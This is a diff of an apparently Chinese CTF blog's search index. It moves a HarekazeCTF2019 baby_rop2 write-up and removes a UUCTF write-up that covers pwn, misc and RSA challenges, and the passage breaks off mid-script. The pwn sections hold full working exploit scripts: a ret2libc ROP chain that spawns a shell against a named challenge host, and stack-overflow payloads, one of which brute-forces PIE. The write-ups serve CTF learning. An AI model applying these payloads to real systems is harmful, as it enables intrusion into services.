@@ -1,51 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>(HarekazeCTF2019)baby_rop2</title>
-    <url>/2021/06/28/HarekazeCTF2019-baby-rop2/</url>
-    <content><![CDATA[<h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>检查保护机制，64位，开NX</p>
-<p><img src="/img/image-20210628183434726.png" alt="image-20210628183434726"></p>
-<p>IDA打开，查看main函数，发现buf大小为0x20,而读入的大小为0x100，存在溢出漏洞</p>
-<p><img src="/img/image-20210628183509508.png" alt="image-20210628183509508"></p>
-<p>再用shift+F12查找字符串，没有发现system(‘/bin/sh’)。</p>
-<p><img src="/img/image-20210628185049992.png" alt="image-20210628185049992"></p>
-<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.buf大小0x20，读入0x100，溢出漏洞，通过利用漏洞覆盖返回地址为system(‘/bin/sh’)</p>
-<p>2.利用read函数，泄露libc基址，然后获取system和/bin/sh字符串的地址</p>
-<p>3.最后将一二步合并完成夺权</p>
-<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>泄露libc基址</p>
-<p>因为printf函数中有两个参数要设置，所以就要找到rsi和rdi寄存器</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary babyrop2 |grep <span class="string">&quot;pop rdi&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/image-20210628202925156.png" alt="image-20210628202925156"></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary babyrop2 |grep <span class="string">&quot;pop rsi&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/image-20210628203023369.png" alt="image-20210628203023369"></p>
-<p>看见rsi后面跟有r15，我们直接设置为0</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_addr)</span><br></pre></td></tr></table></figure>
-
-<p>1.b‘a’*0x28–&gt;造成溢出，覆盖到了返回地址<br>2.p64(pop_rdi)+p64(format_str)–&gt;我们在原本语句的返回地址上写入了pop_rdi,ret，pop_rdi，对应参数format_str,执行后将formast_str的值设置给了rdi，之后执行ret（返回指令）<br>3.p64(pop_rsi_r15)+p64(read_got)+p64(0)–&gt; 我们将2中的ret写成了pop_rsi,pop_r15,ret;执行指令pop_rsi对应参数read_got,将rsi寄存器的值设置成了read函数的got表地址，pop_r15对应参数0，由于我们不用r15，随便设置一下它，我是设置成了0<br>4.p64(printf_plt)–&gt;将3中的ret设置成printf函数的plt表地址，实际上就是printf函数的地址，去执行printf函数，输出我们设置的read函数的地址<br>5.p64(main_addr)–&gt; 在完成第一次利用后，得到了程序内read函数的地址，知道了libc基址，我们需要重新回到程序开头，再次利用这个输入点去写入system‘（/bin/sh）’</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">read_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)  <span class="comment">#利用libcsearcher库去查找匹配的libc版本</span></span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)  <span class="comment">#计算程序里的偏移量</span></span><br></pre></td></tr></table></figure>
-
-<p>计算system和(‘/bin/sh’)的地址</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29233</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400731</span> </span><br><span class="line">format_str = <span class="number">0x400770</span>  <span class="comment">#%s所在字符串</span></span><br><span class="line">ret_addr = <span class="number">0x400734</span></span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_plt = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_plt)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name? &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>最后拿flag时，发现flag还没有放在根目录下，需要find -name “flag”去查找，最后cat flag</p>
-<p><img src="/img/image-20210628210723648.png" alt="image-20210628210723648"></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SROP</title>
     <url>/2021/06/28/SROP/</url>
     <content><![CDATA[<h1 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h1><p>Srop 的全称是Sigreturn Oriented Programming</p>
@@ -69,56 +24,6 @@
       <categories>
         <category>笔记</category>
       </categories>
-  </entry>
-  <entry>
-    <title>UUCTF writeup</title>
-    <url>/2023/05/30/UUCTF%20writeup/</url>
-    <content><![CDATA[<span id="more"></span>
-
-<h1 id="UUCTF-writeup"><a href="#UUCTF-writeup" class="headerlink" title="UUCTF writeup"></a>UUCTF writeup</h1><h3 id="writer-Pr0b1em-小菜鸡二进制选手，目标全栈选手，不配"><a href="#writer-Pr0b1em-小菜鸡二进制选手，目标全栈选手，不配" class="headerlink" title="writer:Pr0b1em(小菜鸡二进制选手，目标全栈选手，不配)"></a>writer:Pr0b1em<del>(小菜鸡二进制选手，目标全栈选手，不配)</del></h3><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h3><p>下载附件，先检查保护机制，只开了NX，64位文件</p>
-<p><img src="/img/1666613003904.png" alt="1666613003904"></p>
-<p>拖入IDA查看，分别查看main函数和字符串，找到关键字符串system和bin/sh，同时发现了vuln函数，继续跟进</p>
-<p><img src="/img/1666613080677.png" alt="1666613080677"></p>
-<p><img src="/img/1666613062494.png" alt="1666613062494"></p>
-<p><img src="/img/1666613139782.png" alt="1666613139782"></p>
-<p>发现buf此处，其中存在栈溢出，同时发现back_door函数，现成直接用 </p>
-<p><img src="/img/1666613319147.png" alt="1666613319147"></p>
-<p>构造脚本</p>
-<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r=remote(&quot;&quot;,)</span></span><br><span class="line">r=process(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400734</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(backdoor)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;What&#x27;s your name?&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="easystack"><a href="#easystack" class="headerlink" title="easystack"></a>easystack</h3><p><strong>花式栈溢出</strong></p>
-<p>检查保护机制，开了NX和PIE,说明基地址随机，估计得碰运气</p>
-<p><img src="/img/1666614235498.png" alt="1666614235498"></p>
-<p>IDA打开，发现内容和上一题几乎一样，唯独不同的点就是溢出空间只够一个后门函数的地址，于是撰写脚本，因为基地址为止，需要碰，所以脚本些许变化</p>
-<p><img src="/img/1666614380686.png" alt="1666614380686"></p>
-<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#p=process(&#x27;./babystack&#x27;)</span></span><br><span class="line">        p=remote(<span class="string">&quot;43.143.7.127&quot;</span>,<span class="number">28054</span>)</span><br><span class="line">        elf=ELF(<span class="string">&#x27;./easystack&#x27;</span>)</span><br><span class="line">        context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">        backdoor=<span class="number">0x1185</span></span><br><span class="line"></span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(backdoor)</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;What&#x27;s your name?&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="just-rce"><a href="#just-rce" class="headerlink" title="just rce"></a>just rce</h3><p>简单的rce，通过rev指令逆序输出就得到flag，后面配上通配符绕过关键字</p>
-<p><img src="/img/1666618211863.png" alt="1666618211863"></p>
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Where-is-flag？"><a href="#Where-is-flag？" class="headerlink" title="Where is flag？"></a>Where is flag？</h3><p>流量分析，wireshark打开后导出特定分组http，发现有个flag压缩包，打开文件发现是png图片格式，010打开，这里发现缺少头文件，于是修复好，发现是个二维码，扫出来的内容存在零宽容度字符，在线网站解密得到flag。</p>
-<p><img src="/img/1666777976579.png" alt="1666777976579"></p>
-<h3 id="搬好小板凳听故事"><a href="#搬好小板凳听故事" class="headerlink" title="搬好小板凳听故事"></a>搬好小板凳听故事</h3><p>简单的解决，用ciphey，好一个三花淡奶！</p>
-<p><img src="/img/1666778096125.png" alt="1666778096125"></p>
-<h3 id="村中奇怪的故事"><a href="#村中奇怪的故事" class="headerlink" title="村中奇怪的故事"></a>村中奇怪的故事</h3><p>这玩意儿图片真给我误导了，没想到就是百家姓加密，后来仔细一看悟出来了，赶紧去试，后来七七上hint也验证了我的想法。说真的，这故事够狗屎，给我看得一愣一愣，解出来之后，居然平台后台flag还是错的，给我整得怀疑人生。</p>
-<h3 id="蜜蜂和蛆"><a href="#蜜蜂和蛆" class="headerlink" title="蜜蜂和蛆"></a>蜜蜂和蛆</h3><p>crc32爆破，通过pass1和pass2分别得到一段密码，然后打开得到一张画着蜜蜂和蛆的png，改宽高，得到一个二维码，扫出来base64解密，<del>文件都删完了，懒得复现了</del></p>
-<h3 id="王八快跑"><a href="#王八快跑" class="headerlink" title="王八快跑"></a>王八快跑</h3><p>让你跑你就跑，签个到！哈哈哈哈</p>
-<h3 id="略略略来抓我啊"><a href="#略略略来抓我啊" class="headerlink" title="略略略来抓我啊"></a>略略略来抓我啊</h3><p>社工还是不太擅长，很久没做过了，找了很久，第一张图暴露了一个钱塘驿，直接暴露了位置，然后就找着地图找宾馆，是个眼力活，也是个体力活</p>
-<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="websign"><a href="#websign" class="headerlink" title="websign"></a>websign</h3><p>F12不管用？那我手动总行了吧！</p>
-<p><img src="/img/1666778791713.png" alt="1666778791713"></p>
-<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="爱丽丝梦境的兔子"><a href="#爱丽丝梦境的兔子" class="headerlink" title="爱丽丝梦境的兔子"></a>爱丽丝梦境的兔子</h3><p>兔子密码、社会主义核心价值观密码和栅栏密码，简单套娃</p>
-<h3 id="disparity-rsa"><a href="#disparity-rsa" class="headerlink" title="disparity_rsa"></a>disparity_rsa</h3><p>这个rsa有手就行，我直接用RsaCTFtools解的，脚本都懒得写了，这里就不放图复现了<del>（是真的懒</del></p>
-<h3 id="Easy-base64"><a href="#Easy-base64" class="headerlink" title="Easy_base64"></a>Easy_base64</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># 这里有个固定的字符串是flag</span></span><br><span class="line"><span class="comment"># 1.根据flag的base64编码可以确定第一个字符的ASCII码对应的是90</span></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#125;&#x27;</span></span><br><span class="line">tmp = base64.b64encode(<span class="built_in">bytes</span>(flag,<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(tmp))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.根据结果往前推ASCII码</span></span><br><span class="line">a = [<span class="number">90</span>, <span class="number">55</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">30</span>, <span class="number">34</span>, <span class="number">16</span>, <span class="number">50</span>,<span class="number">111</span>,<span class="number">74</span>, <span class="number">62</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">54</span>, <span class="number">52</span>,<span class="number">106</span>, <span class="number">85</span>, <span class="number">31</span>, <span class="number">54</span>, <span class="number">24</span>, <span class="number">111</span>, <span class="number">83</span>, <span class="number">11</span>, <span class="number">38</span>, <span class="number">1</span>, <span class="number">53</span>, <span class="number">17</span>, <span class="number">37</span>, <span class="number">17</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">32</span>, <span class="number">52</span>, <span class="number">40</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">59</span>, <span class="number">47</span>, <span class="number">54</span>, <span class="number">25</span>, <span class="number">111</span>, <span class="number">77</span>, <span class="number">16</span>, <span class="number">48</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">9</span>, <span class="number">55</span>, <span class="number">108</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a)-<span class="number">1</span>):</span><br><span class="line">    t = a[i] ^ a[i+<span class="number">1</span>]</span><br><span class="line">    a[i+<span class="number">1</span>] = t</span><br><span class="line">    <span class="built_in">print</span>(t, end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">109,34,5,34,91,46,73,21,50,55,60,50,34,93,37,116,59,23,36,2,94,63,74,41,46,119,60,88,45,39,52,36,52,52,50,12,15,20,28,42,11,50,20,25,47,118,34,93,32,42,59,40,62,91,108,56</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">b = [<span class="number">90</span>, <span class="number">109</span>,<span class="number">120</span>,<span class="number">104</span>,<span class="number">90</span>,<span class="number">51</span>,<span class="number">116</span>,<span class="number">122</span>,<span class="number">97</span>,<span class="number">72</span>,<span class="number">86</span>,<span class="number">116</span>,<span class="number">100</span>,<span class="number">86</span>,<span class="number">57</span>,<span class="number">115</span>,<span class="number">77</span>,<span class="number">72</span>,<span class="number">90</span>,<span class="number">108</span>,<span class="number">88</span>,<span class="number">50</span>,<span class="number">103</span>,<span class="number">120</span>,<span class="number">78</span>,<span class="number">86</span>,<span class="number">57</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">71</span>,<span class="number">70</span>,<span class="number">115</span>,<span class="number">98</span>,<span class="number">71</span>,<span class="number">86</span>,<span class="number">117</span>,<span class="number">90</span>,<span class="number">122</span>,<span class="number">78</span>,<span class="number">102</span>,<span class="number">100</span>,<span class="number">109</span>,<span class="number">86</span>,<span class="number">121</span>,<span class="number">79</span>,<span class="number">86</span>,<span class="number">57</span>,<span class="number">116</span>,<span class="number">100</span>,<span class="number">84</span>,<span class="number">78</span>,<span class="number">111</span>,<span class="number">102</span>,<span class="number">81</span>,<span class="number">61</span>,<span class="number">61</span>,<span class="number">104</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.解密</span></span><br><span class="line">a = <span class="string">b&#x27;ZmxhZ3tzaHVtdV9sMHZlX2gxNV9jaGFsbGVuZzNfdmVyOV9tdTNofQ==h&#x27;</span></span><br><span class="line">tmp = base64.b64decode(a)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure>
-
-<h3 id="unsafe-prime"><a href="#unsafe-prime" class="headerlink" title="unsafe_prime"></a>unsafe_prime</h3><p>这里考察的知识点就是当n不是由两个不相等的质数相乘得到的时的解法，属于另一种欧拉定理的运用，phin不再是(p-1)*(q-1)，而是p^3-p^2</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from Crypto.Util.number import *</span></span><br><span class="line"><span class="string">#from flag import flag</span></span><br><span class="line"><span class="string">import libnum</span></span><br><span class="line"><span class="string">p=getPrime(1024)</span></span><br><span class="line"><span class="string">n=p**3</span></span><br><span class="line"><span class="string">e=65537</span></span><br><span class="line"><span class="string">flag=&#x27;flag&#123;luoxiheng&#125;&#x27;</span></span><br><span class="line"><span class="string">c=pow(libnum.s2n(flag),e,n)</span></span><br><span class="line"><span class="string">print(n)</span></span><br><span class="line"><span class="string">print(c)</span></span><br><span class="line"><span class="string">#1781066779141074297846071955037887396311182371062305797790413639302252321886055189043670187843106208315282055227397316083218930657040969292641990094428330517286511511741846106485971830443788363541411679523274683568732340113625424593194464460018629545968907529693143364870519531630721083893407011154181539445417439610805148961135948617691115328261432541033785402520757881586489819563221498111411690769065511011083021336493731421274742041131952523427183184133413677315203810963447656037908287875212013900845740870561508870574734100843624059414134156975073835607712519402938132401964708681236647568922173471703538744207491065165405594141287750705055447493380970194312139898574699147098202027540057477562090764694370368571887563631557761911842054442637038169316686266784299889397326811768646649462480349219937292894824766045607723468654723947999531346474969019631500665628522355198334827965770037487344994396753505248472283247731</span></span><br><span class="line"><span class="string">#1402371150275079475353867962992356093684205278224746766691813462864343871795075217989508355749642716635931824907174189358797217546624305634264458802157933311315419673854405865092102322247505412453586251582022669511221048298234732642016439123525455296325766292112758881774720932499142635136210314142144509741404827421282969081272484330382868174392651681290127032351489627054643864671335712011990584326951285867375878235135547391155357814807654366986019707719726796289990920154227959213228064918435259919697047405788311280560319520593639968900649500117511665741073545430999580686455996145426173603547052710181735901020361145546892741579951501409108067297139928103329203429485237575169217432586580425019729120741661192297552519858305628835738911159460615968385837687234565509200392302553443089729906970894661310333276852803980265040679214814192141779678148895736682538612828771031493541256243879854624644771924477873876038496224</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n=<span class="number">1781066779141074297846071955037887396311182371062305797790413639302252321886055189043670187843106208315282055227397316083218930657040969292641990094428330517286511511741846106485971830443788363541411679523274683568732340113625424593194464460018629545968907529693143364870519531630721083893407011154181539445417439610805148961135948617691115328261432541033785402520757881586489819563221498111411690769065511011083021336493731421274742041131952523427183184133413677315203810963447656037908287875212013900845740870561508870574734100843624059414134156975073835607712519402938132401964708681236647568922173471703538744207491065165405594141287750705055447493380970194312139898574699147098202027540057477562090764694370368571887563631557761911842054442637038169316686266784299889397326811768646649462480349219937292894824766045607723468654723947999531346474969019631500665628522355198334827965770037487344994396753505248472283247731</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p = <span class="number">121216033233585299462279856144422199686140149244819402908675131452249143435823157035320400025743305736047792084067723177554239638229731651194515823556880874798950035236056266154727789682357822323822962110560589110432270068487448525123808163818606838762211746373156874518622834972063360072190758655502892772811</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = p**<span class="number">3</span></span><br><span class="line">phi_n= p**<span class="number">3</span>-p**<span class="number">2</span></span><br><span class="line">c=<span class="number">1402371150275079475353867962992356093684205278224746766691813462864343871795075217989508355749642716635931824907174189358797217546624305634264458802157933311315419673854405865092102322247505412453586251582022669511221048298234732642016439123525455296325766292112758881774720932499142635136210314142144509741404827421282969081272484330382868174392651681290127032351489627054643864671335712011990584326951285867375878235135547391155357814807654366986019707719726796289990920154227959213228064918435259919697047405788311280560319520593639968900649500117511665741073545430999580686455996145426173603547052710181735901020361145546892741579951501409108067297139928103329203429485237575169217432586580425019729120741661192297552519858305628835738911159460615968385837687234565509200392302553443089729906970894661310333276852803980265040679214814192141779678148895736682538612828771031493541256243879854624644771924477873876038496224</span></span><br><span class="line">d=gmpy2.invert(e,phi_n)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#print(binascii.unhexlify(hex(m)[2:]))</span></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line">string = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(string)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
   </entry>
   <entry>
     <title>Pwn入门指南</title>
@@ -182,6 +87,101 @@
 ]]></content>
       <categories>
         <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>(HarekazeCTF2019)baby_rop2</title>
+    <url>/2021/06/28/HarekazeCTF2019-baby-rop2/</url>
+    <content><![CDATA[<h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>检查保护机制，64位，开NX</p>
+<p><img src="/img/image-20210628183434726.png" alt="image-20210628183434726"></p>
+<p>IDA打开，查看main函数，发现buf大小为0x20,而读入的大小为0x100，存在溢出漏洞</p>
+<p><img src="/img/image-20210628183509508.png" alt="image-20210628183509508"></p>
+<p>再用shift+F12查找字符串，没有发现system(‘/bin/sh’)。</p>
+<p><img src="/img/image-20210628185049992.png" alt="image-20210628185049992"></p>
+<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.buf大小0x20，读入0x100，溢出漏洞，通过利用漏洞覆盖返回地址为system(‘/bin/sh’)</p>
+<p>2.利用read函数，泄露libc基址，然后获取system和/bin/sh字符串的地址</p>
+<p>3.最后将一二步合并完成夺权</p>
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>泄露libc基址</p>
+<p>因为printf函数中有两个参数要设置，所以就要找到rsi和rdi寄存器</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary babyrop2 |grep <span class="string">&quot;pop rdi&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20210628202925156.png" alt="image-20210628202925156"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary babyrop2 |grep <span class="string">&quot;pop rsi&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20210628203023369.png" alt="image-20210628203023369"></p>
+<p>看见rsi后面跟有r15，我们直接设置为0</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_addr)</span><br></pre></td></tr></table></figure>
+
+<p>1.b‘a’*0x28–&gt;造成溢出，覆盖到了返回地址<br>2.p64(pop_rdi)+p64(format_str)–&gt;我们在原本语句的返回地址上写入了pop_rdi,ret，pop_rdi，对应参数format_str,执行后将formast_str的值设置给了rdi，之后执行ret（返回指令）<br>3.p64(pop_rsi_r15)+p64(read_got)+p64(0)–&gt; 我们将2中的ret写成了pop_rsi,pop_r15,ret;执行指令pop_rsi对应参数read_got,将rsi寄存器的值设置成了read函数的got表地址，pop_r15对应参数0，由于我们不用r15，随便设置一下它，我是设置成了0<br>4.p64(printf_plt)–&gt;将3中的ret设置成printf函数的plt表地址，实际上就是printf函数的地址，去执行printf函数，输出我们设置的read函数的地址<br>5.p64(main_addr)–&gt; 在完成第一次利用后，得到了程序内read函数的地址，知道了libc基址，我们需要重新回到程序开头，再次利用这个输入点去写入system‘（/bin/sh）’</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">read_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)  <span class="comment">#利用libcsearcher库去查找匹配的libc版本</span></span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)  <span class="comment">#计算程序里的偏移量</span></span><br></pre></td></tr></table></figure>
+
+<p>计算system和(‘/bin/sh’)的地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29233</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400731</span> </span><br><span class="line">format_str = <span class="number">0x400770</span>  <span class="comment">#%s所在字符串</span></span><br><span class="line">ret_addr = 